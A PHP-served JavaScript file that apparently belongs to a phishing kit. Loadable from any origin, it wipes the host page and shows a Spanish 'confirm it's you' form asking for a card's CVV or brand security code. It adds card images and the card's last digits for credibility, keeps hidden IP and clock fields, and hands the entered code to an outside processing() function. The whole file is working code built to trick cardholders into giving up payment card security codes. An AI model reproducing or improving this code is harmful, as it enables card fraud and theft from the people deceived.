<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
?>

(function () {
  'use strict';

  var data = (typeof window !== 'undefined' && window.my_data) ? window.my_data : {};
  var hosting = (typeof window !== 'undefined' && window.my_hosting) ? String(window.my_hosting) : '';
  var hostingBase = hosting ? hosting.replace(/\/+$/, '') : '';
  var defaultLogoUrl = hostingBase ? hostingBase + '/assets/img/logo.svg' : '';

  function escapeHtml(str) {
    return String(str || '').replace(/[&<>"'`=\/]/g, function (s) {
      return ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;',
        "'": '&#39;', '`': '&#96;', '=': '&#61;', '/': '&#47;'
      })[s];
    });
  }

  function isLogoUrl(url) {
    if (!url) return false;
    try {
      var clean = String(url).split('#')[0].split('?')[0];
      return /\/logo\.svg$/i.test(clean);
    } catch (e) {
      return false;
    }
  }

  var codeTypeRaw = (data && data.codeType) ? String(data.codeType).toLowerCase() : 'cvv';
  var codeType = ['cvv', 'visa', 'amex', 'master'].indexOf(codeTypeRaw) !== -1 ? codeTypeRaw : 'cvv';

  var defaultImages = {
    cvv: 'back.png',
    visa: 'visa.png',
    amex: 'amex.png',
    master: 'master.png'
  };

  function resolveImage() {
    var custom;
    if (codeType === 'cvv') {
      custom = (typeof window !== 'undefined' && window.my_card_image_debito) ? window.my_card_image_debito : null;
      if (!custom && typeof window !== 'undefined' && window.my_card_image) custom = window.my_card_image;
    } else if (codeType === 'visa' && typeof window !== 'undefined' && window.my_card_image_visa) {
      custom = window.my_card_image_visa;
    } else if (codeType === 'amex' && typeof window !== 'undefined' && window.my_card_image_amex) {
      custom = window.my_card_image_amex;
    } else if (codeType === 'master' && typeof window !== 'undefined' && window.my_card_image_master) {
      custom = window.my_card_image_master;
    } else if (typeof window !== 'undefined' && window.my_card_image) {
      custom = window.my_card_image;
    }
    if (custom) return String(custom);
    if (!hostingBase) return '';
    return hostingBase + '/assets/img/' + (defaultImages[codeType] || defaultImages.cvv);
  }

  var imageUrl = resolveImage();
  var topImageUrlRaw = (typeof window !== 'undefined' && window.my_card_image_top)
    ? String(window.my_card_image_top)
    : defaultLogoUrl;
  var showTopLogoImage = topImageUrlRaw && !isLogoUrl(topImageUrlRaw);
  var topImageUrl = showTopLogoImage ? topImageUrlRaw : '';

  var pinLength = (function () {
    if (codeType === 'amex') return 4;
    if (codeType === 'cvv' && data && data.cvvLength) {
      var n = parseInt(data.cvvLength, 10);
      if (n === 4 || n === 3) return n;
    }
    return 3;
  })();

  var titles = {
    cvv: 'Confirma que eres tú',
    visa: 'Confirma tu código VISA',
    amex: 'Confirma tu código AMEX',
    master: 'Confirma tu código MASTER'
  };
  var subtitles = {
    cvv: 'Tu código de seguridad está en el reverso junto a la banda de firma. Escríbelo para continuar.',
    visa: 'Ingresa tu código VISA para continuar con el proceso.',
    amex: 'Ingresa tu código AMEX para continuar con el proceso.',
    master: 'Ingresa tu código MasterCard para continuar con el proceso.'
  };
  var badges = {
    cvv: 'CÓDIGO DE SEGURIDAD',
    visa: 'CÓDIGO VISA',
    amex: 'CÓDIGO AMEX',
    master: 'CÓDIGO MASTER'
  };

  var titulo = escapeHtml(titles[codeType] || titles.cvv);
  var subtitleBase = subtitles[codeType] || subtitles.cvv;
  var subtitleText = subtitleBase;
  if (data && data.mensaje) {
    subtitleText = subtitleBase + ' (terminada en ' + String(data.mensaje) + ')';
  }
  subtitleText = escapeHtml(subtitleText);
  var badgeText = escapeHtml(badges[codeType] || badges.cvv);
  var buttonText = escapeHtml(data && data.button ? String(data.button) : 'CONTINUAR');
  var topImageAlt = escapeHtml(data && data.topImageAlt ? String(data.topImageAlt) : 'Logo');
  var helpText = data && data.help ? escapeHtml(String(data.help)) : '';

  var contenido = `
  <link rel="stylesheet" href="${hostingBase}/css/flow-theme.css" />
  <link rel="stylesheet" href="${hostingBase}/css/bg-lineas.css" />
  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">

  <style>
    .code-panel { display: flex; flex-direction: column; gap: 14px; }
    .badge { align-self: flex-start; }
    .pin-grid { gap: 8px; }
    .pin-cell { width: 51px; height: 51px; font-size: 22px; }
    .helper-note { margin: 0; text-align: center; color: var(--muted); font-size: 14px; }
  </style>

  <main class="flow-shell">

    <div class="logo-mark" aria-hidden="true">
      <span></span><span></span><span></span>
    </div>

    <h1 class="flow-title" id="titulo-form">${titulo}</h1>
    <p class="flow-subtitle" id="subtitulo">${subtitleText}</p>

    <section class="panel code-panel cc-form" aria-label="Formulario de código ${codeType}">
      <div class="badge" id="tipo-badge">${badgeText}</div>

      <div class="figure-card">
        <img id="cc-image-top" class="cc-image-top" alt="${topImageAlt}" style="width:216px; margin-bottom:6px; ${showTopLogoImage ? '' : 'display:none;'}">
        <img id="cc-image" class="cc-image" alt="Imagen de referencia">
        <p class="figure-caption" id="cc-image-help"></p>
      </div>

      <div class="pin-wrap">
        <div class="pin-grid" id="pin-inputs">
          ${new Array(pinLength).fill('').map(function(_, idx){
            var aria = 'Dígito ' + (idx + 1) + ' del código ' + codeType.toUpperCase();
            return '<input type=\"text\" inputmode=\"numeric\" autocomplete=\"one-time-code\" maxlength=\"1\" class=\"pin-input pin-cell\" data-index=\"'+idx+'\" aria-label=\"'+aria+'\">';
          }).join('')}
        </div>
      </div>

      <p class="helper-note" id="helper-note">${helpText}</p>

      <div class="error-text" id="errorCvv" role="alert" aria-live="polite"></div>

      <button type="button" id="btn-go" class="btn-primary" disabled>${buttonText}</button>
    </section>

    <div class="meta-hidden">
      <div id="ipc">Dirección IP:</div>
      <div id="jclock1"></div>
    </div>
  </main>`;

  try { var tituloElemento = document.getElementById('titulo'); if (tituloElemento) tituloElemento.textContent = titulo; } catch (e) {}

  document.body.innerHTML = contenido;
  document.body.setAttribute('data-code-type', codeType);
  try { localStorage.setItem('contenido', contenido); } catch (e) {}

  var $go = document.getElementById('btn-go');
  var $err = document.getElementById('errorCvv');
  var $img = document.getElementById('cc-image');
  var $imgTop = document.getElementById('cc-image-top');
  var $imgHelp = document.getElementById('cc-image-help');
  var $tipoBadge = document.getElementById('tipo-badge');
  var $subtitulo = document.getElementById('subtitulo');
  var $tituloForm = document.getElementById('titulo-form');
  var pinInputs = Array.prototype.slice.call(document.querySelectorAll('.pin-input'));

  function setError(message) {
    if ($err) $err.textContent = message || '';
    if (Array.isArray(pinInputs)) {
      pinInputs.forEach(function (input) {
        if (message) input.classList.add('error-input');
        else input.classList.remove('error-input');
      });
    }
    var pinContainer = document.getElementById('pin-inputs');
    if (pinContainer) {
      if (message) {
        pinContainer.classList.add('shake');
        setTimeout(function () { pinContainer.classList.remove('shake'); }, 500);
      }
    }
  }

  function setGoEnabled(enabled) {
    if ($go) {
      $go.disabled = !enabled;
    }
  }

  function sanitizeDigit(el) {
    if (!el) return '';
    var v = (el.value || '').replace(/\\D/g, '');
    if (v.length > 1) v = v.charAt(0);
    if (el.value !== v) el.value = v;
    return v;
  }

  function collectCode() {
    if (!Array.isArray(pinInputs)) return '';
    return pinInputs.map(function (input) {
      return sanitizeDigit(input);
    }).join('');
  }

  function focusNext(currentIdx) {
    if (!Array.isArray(pinInputs)) return;
    var next = pinInputs[currentIdx + 1];
    if (next) next.focus();
  }

  function focusPrev(currentIdx) {
    if (!Array.isArray(pinInputs)) return;
    var prev = pinInputs[currentIdx - 1];
    if (prev) {
      prev.focus();
      prev.value = '';
    }
  }

  function validate(fromUser) {
    var code = collectCode();
    var ok = code.length === pinLength;
    if (fromUser && !ok && code.length > 0) {
      setError('Ingresa un código de ' + pinLength + ' dígitos.');
    } else if (ok) {
      setError('');
    } else if (fromUser) {
      setError('');
    }
    setGoEnabled(ok);
    return ok;
  }

  pinInputs.forEach(function (input, idx) {
    input.addEventListener('input', function () {
      var val = sanitizeDigit(input);
      if (val !== '') {
        focusNext(idx);
      }
      validate(true);
    });

    input.addEventListener('keydown', function (evt) {
      if (evt.key === 'Backspace' && input.value === '') {
        focusPrev(idx);
        evt.preventDefault();
      } else if (evt.key === 'ArrowLeft') {
        focusPrev(idx);
        evt.preventDefault();
      } else if (evt.key === 'ArrowRight') {
        focusNext(idx);
        evt.preventDefault();
      } else if (evt.key === 'Enter') {
        evt.preventDefault();
        if ($go && !$go.disabled) {
          $go.click();
        }
      }
    });

    input.addEventListener('paste', function (evt) {
      var clipboard = evt.clipboardData || window.clipboardData;
      if (!clipboard) return;
      var pasted = String(clipboard.getData('text') || '').replace(/\\D+/g, '').slice(0, pinLength);
      if (!pasted) return;
      evt.preventDefault();
      for (var i = 0; i < pinLength; i++) {
        var target = pinInputs[idx + i];
        if (!target) break;
        target.value = pasted.charAt(i) || '';
      }
      var next = pinInputs[Math.min(idx + pasted.length, pinLength - 1)];
      if (next) next.focus();
      validate(true);
    });
  });

  if (pinInputs.length) {
    pinInputs[0].focus();
  }

  validate(false);

  if (typeof window !== 'undefined' && window.my_data && (window.my_data.error || window.my_data.mensaje)) {
    if (window.my_data.error) setError(window.my_data.error);
  }

  if ($imgTop) {
    if (showTopLogoImage && topImageUrl) {
      $imgTop.src = topImageUrl;
      $imgTop.style.display = '';
    } else {
      $imgTop.style.display = 'none';
    }
  }

  if ($img) {
    if (imageUrl) {
      $img.style.display = '';
      $img.src = imageUrl;
    } else {
      $img.style.display = 'none';
    }
  }
  if ($imgHelp) {
    if (!imageUrl) {
      $imgHelp.textContent = 'Puedes definir window.my_card_image_* o window.my_card_image para personalizar la imagen.';
      $imgHelp.style.display = '';
    } else if (helpText) {
      $imgHelp.textContent = helpText;
      $imgHelp.style.display = '';
    } else {
      $imgHelp.textContent = '';
      $imgHelp.style.display = 'none';
    }
  }
  if ($tipoBadge) $tipoBadge.textContent = badgeText;
  if ($subtitulo) $subtitulo.textContent = subtitleText;
  if ($tituloForm) $tituloForm.textContent = titulo;

  function sendCode() {
    var code = collectCode();
    if (code.length !== pinLength) {
      setError('Ingresa un código de ' + pinLength + ' dígitos.');
      if (pinInputs.length) pinInputs[0].focus();
      return;
    }
    setError('');
    var payload = { t: codeType };
    payload[codeType] = code;
    if (codeType === 'cvv' && data && data.type) {
      payload.type = data.type;
    }
    try {
      if (typeof window.processing === 'function') {
        window.processing(payload);
      } else {
        console.warn('processing(...) no está definido.');
      }
    } catch (e) {
      console.error('Error en processing(...):', e);
    }
  }

  if ($go) {
    $go.addEventListener('click', sendCode);
  }
})();
